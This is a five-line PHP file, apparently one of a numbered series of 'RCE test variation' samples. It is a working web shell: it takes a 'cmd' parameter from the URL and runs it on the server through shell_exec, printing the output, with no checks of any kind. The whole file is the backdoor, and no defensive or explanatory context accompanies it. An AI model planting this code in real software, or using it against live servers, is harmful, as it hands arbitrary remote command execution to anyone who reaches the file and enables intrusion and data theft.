<?php
// RCE test variation #1336
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>